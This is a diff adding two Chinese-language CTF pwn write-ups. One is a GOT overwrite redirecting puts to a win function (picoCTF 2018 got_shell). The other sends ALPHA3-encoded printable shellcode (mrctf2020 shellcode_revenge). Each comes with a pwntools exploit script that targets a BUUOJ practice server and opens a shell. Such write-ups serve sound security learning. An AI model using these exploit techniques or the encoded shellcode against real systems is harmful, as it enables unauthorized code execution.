@@ -312,8 +312,84 @@ sl(payload)
 shell()
 ```
 
+## BUUCTF-picoctf_2018_got_shell
+拥有任意地址写能力
 
+<img width="830" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/26035b99-46e9-4d03-b405-3729ebf57a61">
 
+在修改后调用了puts函数 程序存在后门函数win 可以考虑修改puts_got为win函数地址
+
+### exp_PicoCTF_2018_got-shell.py
+```python
+from pwn import *
+# p = process("./PicoCTF_2018_got-shell")
+p = remote("node4.buuoj.cn",25647)
+context.log_level = 'debug'
+# context.arch = 'amd64'
+# context(os="linux", arch="amd64",log_level = "debug")
+
+r = lambda : p.recv()
+rx = lambda x: p.recv(x)
+ru = lambda x: p.recvuntil(x)
+rud = lambda x: p.recvuntil(x, drop=True)
+s = lambda x: p.send(x)
+sl = lambda x: p.sendline(x)
+sa = lambda x, y: p.sendafter(x, y)
+sla = lambda x, y: p.sendlineafter(x, y)
+shell = lambda : p.interactive()
+
+puts_got = 0x804a00c
+win = 0x804854B
+
+ru('4 byte value?\n')
+raw_input("Ther")
+sl('0x804a00c')
+
+ru('write to')
+raw_input("Ther")
+sl('0x804854B')
+
+shell()
+```
+
+## BUUCTF-mrctf2020_easy_equation
+可见字符shellcode
+
+首先利用pwntools生成默认的shellcode 输入到文件中
+
+然后通过alpha3工具将其转化成可见字符的shellcode
+
+```sh
+python ./ALPHA3.py x64 ascii mixedcase rax --input="sc.bin" > out.bin
+```
+
+### exp_mrctf2020_shellcode_revenge.py
+```python
+from pwn import *
+# p = process("./mrctf2020_shellcode_revenge")
+p = remote("node4.buuoj.cn",27656)
+context.log_level = 'debug'
+context.arch = 'amd64'
+# context(os="linux", arch="amd64",log_level = "debug")
+
+r = lambda : p.recv()
+rx = lambda x: p.recv(x)
+ru = lambda x: p.recvuntil(x)
+rud = lambda x: p.recvuntil(x, drop=True)
+s = lambda x: p.send(x)
+sl = lambda x: p.sendline(x)
+sa = lambda x, y: p.sendafter(x, y)
+sla = lambda x, y: p.sendlineafter(x, y)
+shell = lambda : p.interactive()
+
+sc = 'Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t'
+
+raw_input("Ther")
+ru('Show me your magic!\n')
+s(sc)
+
+shell()
+```
 
 
 
